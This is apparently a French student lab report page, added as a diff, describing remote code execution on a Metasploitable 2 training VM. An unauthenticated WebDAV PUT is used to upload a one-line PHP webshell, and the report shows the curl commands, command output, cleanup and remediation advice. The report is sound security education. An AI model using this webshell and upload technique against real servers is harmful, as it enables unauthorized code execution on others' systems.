@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Web Apache — WebDAV RCE — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">Web Apache — WebDAV → RCE</h1>
+    <h2 class="doc-subtitle">Écriture WebDAV sans authentification + exécution PHP → exécution de code à distance</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>Apache httpd 2.2.8 (WebDAV) — port <code class="mono">80</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 2 — <code class="mono">192.168.56.101</code></td></tr>
+      <tr><td class="label">Faiblesse</td><td>Méthode <code>PUT</code> WebDAV autorisée sans authentification + exécution PHP dans <code>/dav/</code></td></tr>
+      <tr><td class="label">Résultat</td><td><strong>RCE www-data</strong> (exécution de commande via webshell)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <h2 class="section">1. Identification</h2>
+  <p>Le serveur Apache héberge plusieurs applications (DVWA, Mutillidae, phpMyAdmin, TWiki) et
+  un répertoire <strong>WebDAV</strong> (<code>/dav/</code>). WebDAV étend HTTP avec des
+  méthodes d'écriture (<code>PUT</code>, <code>DELETE</code>). La bannière annonce
+  <code>DAV/2</code>, et la page d'accueil liste le répertoire WebDAV.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms2-web/01-recon-nmap.png" alt="Scan nmap du port 80 et liste des applications">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc"><code>nmap -sV -p 80</code> révèle <code>Apache httpd 2.2.8 (Ubuntu)
+      DAV/2</code> (module WebDAV actif) ; la page d'accueil liste <code>/dav/</code> parmi les
+      applications.</span>
+      <span class="fname">images/ms2-web/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Test d'écriture WebDAV (méthode PUT)</h2>
+  <p>On vérifie si le serveur accepte l'écriture de fichiers dans <code>/dav/</code> sans
+  authentification :</p>
+
+  <pre class="terminal">$ curl -X PUT http://192.168.56.101/dav/josatest.txt --data "hello-josa"
+   ... 201 Created
+$ curl http://192.168.56.101/dav/josatest.txt
+hello-josa</pre>
+
+  <p>Le code <strong><code>201 Created</code></strong> et la relecture du fichier confirment
+  que <code>PUT</code> est autorisé <strong>sans authentification</strong>. Si PHP s'exécute
+  dans ce répertoire, cela ouvre une exécution de code à distance.</p>
+
+  <figure class="capture" id="cap-put">
+    <img src="../images/ms2-web/02-put-test.png" alt="Test PUT WebDAV réussi">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Dépôt d'un fichier texte par <code>PUT</code> (<code>201 Created</code>)
+      puis relecture (<code>hello-josa</code>) : l'écriture WebDAV est ouverte.</span>
+      <span class="fname">images/ms2-web/02-put-test.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation — webshell PHP</h2>
+  <p>On dépose un webshell PHP minimal qui exécute la commande passée dans le paramètre
+  <code>c</code>, puis on l'appelle :</p>
+
+  <pre class="terminal">$ printf '&lt;?php system($_GET["c"]); ?&gt;' | curl -X PUT http://192.168.56.101/dav/j.php --data-binary @-
+   ... 201 Created
+$ curl "http://192.168.56.101/dav/j.php?c=id;uname%20-a;hostname"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+metasploitable</pre>
+
+  <blockquote class="evidence">
+    Le fichier <code>.php</code> déposé par WebDAV est interprété par PHP &mdash; exécution de
+    commande arbitraire côté serveur, en tant que <code>www-data</code>, sans aucun
+    identifiant.
+  </blockquote>
+
+  <figure class="capture" id="cap-rce">
+    <img src="../images/ms2-web/03-webshell-rce.png" alt="Webshell PHP exécutant id, uid=33 www-data">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc">Dépôt du webshell (<code>201</code>) puis exécution de
+      <code>id;uname -a;hostname</code> : réponse <code>uid=33(www-data)</code> — preuve de
+      l'exécution de code à distance (RCE).</span>
+      <span class="fname">images/ms2-web/03-webshell-rce.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>Le webshell renvoie <code>uid=33(www-data)</code> : on exécute des commandes avec les
+  droits du serveur web. À partir de là, on peut lire/écrire ce qui est accessible à
+  <code>www-data</code>, établir un reverse shell interactif, ou chercher une élévation de
+  privilèges. Par hygiène, les fichiers déposés sont ensuite retirés
+  (<code>DELETE</code> → <code>204</code>) pour ne pas laisser de webshell sur la cible.</p>
+
+  <figure class="capture" id="cap-cleanup">
+    <img src="../images/ms2-web/04-cleanup.png" alt="Suppression des fichiers déposés via DELETE">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc">Nettoyage : <code>DELETE</code> du webshell et du fichier de test
+      (<code>204 No Content</code>).</span>
+      <span class="fname">images/ms2-web/04-cleanup.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li>Désactiver WebDAV s'il n'est pas nécessaire, ou exiger une authentification forte et
+      restreindre les méthodes autorisées (interdire <code>PUT</code>/<code>DELETE</code> aux
+      utilisateurs non authentifiés).</li>
+      <li>Empêcher l'exécution de scripts (PHP, CGI) dans les répertoires où des fichiers
+      peuvent être téléversés (directive <code>php_admin_flag engine off</code>,
+      <code>RemoveHandler</code>).</li>
+      <li>Mettre à jour Apache et appliquer le principe du moindre privilège sur les répertoires
+      exposés.</li>
+      <li>Traiter aussi les autres applications hébergées (DVWA, Mutillidae, phpMyAdmin, TWiki)
+      qui présentent chacune leurs propres vulnérabilités.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms2/josa/web.md"><code>ms2/josa/web.md</code></a> (dépôt du labo)</li>
+    <li>WebDAV (RFC 4918) — méthodes <code>PUT</code>/<code>DELETE</code> ; risque d'upload de webshell.</li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — Web Apache, WebDAV RCE</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
